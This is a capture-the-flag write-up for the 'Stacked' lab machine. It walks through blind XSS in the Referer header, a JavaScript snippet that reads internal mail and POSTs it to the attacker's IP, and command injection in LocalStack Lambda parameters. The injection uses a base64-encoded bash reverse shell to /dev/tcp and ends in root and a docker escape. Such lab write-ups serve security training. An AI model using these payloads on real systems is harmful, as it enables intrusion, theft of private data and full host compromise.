## Enumeration

```bash
PORT STATE SERVICE VERSION 
22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) 
80/tcp open http Apache httpd 2.4.41 
|_http-server-header: Apache/2.4.41 (Ubuntu) 
|_http-title: STACKED.HTB 
2376/tcp open ssl/docker? 
| ssl-cert: Subject: commonName=0.0.0.0 
| Subject Alternative Name: DNS:localhost, DNS:stacked, IP Address:0.0.0.0, IP Address:127.0.0.1, IP Address:172.17.0.1 
| Not valid before: 2021-07-17T15:37:02 
|_Not valid after: 2022-07-17T15:37:02 
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## HTTP
Add entry to local hosts:
`echo "10.10.11.112 stacked.htb" | sudo tee -a /etc/hosts`

On the web app we don't find anything interesting. There's a `SEND` function on the main page but it does not work properly. The source code also doesn't reveal anything. 

Let's move onto vhost and directory enumeration:

```bash
wfuzz -w /usr/share/dirb/wordlists/common.txt -H "Host: FUZZ.stacked.htb" --sc 200
```

Add the new subdomain discovered in hosts file `portfolio.stacked.htb`.

Navigate to the portfolio page. In the About section we learn that a local AWS implementation based on LocalStack is used. There we can download a mock AWS demo (the docker image) of their service. 

Read the docker file. There we find the following information:

```bash
container_name: "${LOCALSTACK_DOCKER_NAME-localstack_main}" 
image: localstack/localstack-full:0.12.6 
network_mode: bridge 
ports: 
	- "127.0.0.1:443:443" 
	- "127.0.0.1:4566:4566" 
	- "127.0.0.1:4571:4571" 
	- "127.0.0.1:${PORT_WEB_UI-8080}:${PORT_WEB_UI-8080}"
```

This configuration specifies a LocalStack Docker container listening on 443, 4566, 4571, and possibly 8080, offering different services. 

Based on the version of LocalStack we find the following CVE-2021-32090:

_The dashboard component of StackLift LocalStack 0.12.6 allows attackers to inject arbitrary shell commands via the functionName parameter._

On the Contact page we see multiple text fields. We can inject multiple XSS payloads all at once by requesting different external resources based on the name of each field, e.g., 

```bash
# on the email field
user@email.com<img src="http://local-ip/email"></img>
# on the name field
123456789<img src="http://local-ip/name"></img>
# ... and so on
```

After the injection we get notified with an error message that reads "XSS detected!". That's because some type filtering prevents XSS on the body of the http request.

However, using the same logic we can try injecting to common headers like the `User-Agent` and `Referer` headers as well. After a while, we get a hit on the `Referer` header.

```http
POST /process.php HTTP/1.1 
Host: portfolio.stacked.htb 
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0 Accept: application/json, text/javascript, */*; q=0.01 
Accept-Language: en-US,en;q=0.5 
Accept-Encoding: gzip, deflate 
Content-Type: application/x-www-form-urlencoded; charset=UTF-8 
X-Requested-With: XMLHttpRequest 
Content-Length: 208 
Origin: http://portfolio.stacked.htb 
DNT: 1 Connection: close 
Referer: <img src="http://local-ip/referer"></img> 

fullname=user&email=user%40stacked.htb&tel=012345667890&subject=Help&message=Please+help
```

We initially used a python server to receive the request but that doesn't provide enough information and we want to see the headers that are send our way. We can use netcat instead and repeat the request. 

```bash
$ sudo nc -lnvp 80

Connection from 10.10.11.112:55460 
```
```http
GET / HTTP/1.1 
Host: 10.10.14.43:80 
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:59.0) Gecko/20100101 Firefox/59.0 
Accept: */* 
Accept-Language: en-US,en;q=0.5 
Accept-Encoding: gzip, deflate 
Referer: http://mail.stacked.htb/read-mail.php?id=2 
Connection: keep-alive
```

The `referer` reveals a new domain `mail.stacked.htb` which we didn't find from the initial vhost enumeration because it redirects back to the main page.

To access the contents of that domain we need to construct a **CSRF attack**. For this attack we need to host a malicious JS file (mimicking the way the initial AJAX request is made from the `XMLHttpRequest` lib) that retrieves sensitive info that exists on the `mail` host. The JS file will look like this:

```Javascript
var req = new XMLHttpRequest();
req.open('GET', 'http://mail.stacked.htb/read-mail.php?id=2', false);
req.send();
var resp = req.responseText;

var req2 = new XMLHttpRequest();
req2.open('POST', 'http://local-ip:1234/', false);
req2.send(resp);
```

Open a local server `python3 -m http.server` to host the file and `nc -lnvp 1234 | out.html` to receive the response.

Modify the post request to `/process/php` and change the `Referer` header to `Referer: <img src="http://local-ip/malicious-file.js"></img>`.

To view the html file on the browser first delete the http headers that netcat adds on it. From the browser we can see that this is a mail service and we find some mails on Inbox section. The message from "Jeremy Taint" is linked with `id=1` so we can repeat the request and modify the malicious JS to read that mail. 

After the attack is finished, we can view the message which states that an S3 instance is set up on `s3-testing.stacked.htb`.

Add this domain to our hosts file. Now that we found an Api we can exploit the **CVE-2021-32090** vulnerability. We can do this via Lambda functions. 

Before that we need to install the AWS command line client `apt install awscli`. Using the CLI we can create a Lambda function. Find an example on how to create one [here](https://docs.aws.amazon.com/lambda/latest/dg/gettingstarted-awscli.html)

Before you create the lambda function we need to configure the region with `aws configure` (provide dummy names for the first two fields) and also create an `index.js` file with the following content and add it to a ZIP archive called `api-handler.zip`. The contexts of this are:

```bash
'use strict'

const apiHandler = (payload, context, callback) => {
    console.log(`Function apiHandler called with payload ${JSON.stringify(payload)}`);
    callback(null, {
        statusCode: 201,
        body: JSON.stringify({
            message: 'Hello World'
        }),
        headers: {
            'X-Custom-Header': 'ASDF'
        }
    }); 
}
    
module.exports = {
    apiHandler,
}
```

`zip api-handler.zip lambda.js`

Next, create the lambda function:
```bash
aws lambda --endpoint=http://s3-testing.stacked.htb create-function \
> --function-name 'whatever' --region eu-west-1
> --zip-file fileb://api-handler.zip --handler index.js --runtime nodejs10.x \
> --role whatever 
```

Remember from the CVE that the injection point is the `function-name` parameter and we need to find the `/dashboard` endpoint too. 

Next, for the command injection we are going to host a file and execute it to gain a shell on the system.  A good practice is to base64 encode the payload to avoid any bad characters issues on the CLI.

`echo -n 'bash -i  &>/dev/tcp/10.10.14.43/4444  0>&1' | base64 -w 0`

Host the file and open the listener:
`python3 -m http.server 5555`
`nc -lnvp 4444`

Modify the following parameter on the lambda function: 
```bash
--function-name 'a;echo <b64-here> | base64 -d | bash'
```

We already know that the WEB-UI is on port 8080 so we can change the `Referer` to `<script>document.location="http://127.0.0.1:8080"</script>`. Create the lambda function as shown above and then send the request. 

After a while we get a shell on the system and we're on the LocalStack container as user `localstack`.

## Privilege Escalation (Hunting for 0-day CVEs)

Download `pspy64` using `wget`. We'll look for all the calls the program makes so run `pspy64`. On a different pane when we create an aws lambda function and **invoke** it we can see on the system the calls that being made out.

```bash
aws lambda --endpoint=http://s3-testing.stacked.htb create-function \ 
> --region eu-west-1 --function-name "test" --runtime nodejs10.x \ 
> --handler index.js --zip-file fileb://api-handler.zip \ 
> --role whatever 

aws lambda --endpoint=http://s3-testing.stacked.htb invoke --function-name "test" out
```

To invoke this process on the system it needs docker (which consequently requires root permissions) we can see the root execute a docker create command to run the lambda instance and passing the `runtime` and `handler` fields on the command. So we have a couple of injection points here. This allows us to inject and execute arbitrary commands with root privileges. 

Now we can grab our reverse base64 shell from earlier and inject into the handler parameter (remember to listen for connections with netcat).

```bash
aws lambda --endpoint=http://s3-testing.stacked.htb create-function \ 
> --region eu-west-1 --function-name "shell" --runtime nodejs10.x \ 
> --handler '$(echo <b64-here> | base64 -d | bash)' --zip-file fileb://api-handler.zip \ 
> --role whatever 

aws lambda --endpoint=http://s3-testing.stacked.htb invoke --function-name "shell" out
```

Within seconds we have a shell as root. Now we can run docker commands to escape the docker. First view the docker images wtih `docker images`.

Use an existing image and override its entrypoint with `/bin/sh`.

`docker run -v /:/mnt --entrypoint sh -it 0601ea177088`. Thereafter we can create a ssh key and connect to the machine with a proper shell as root.

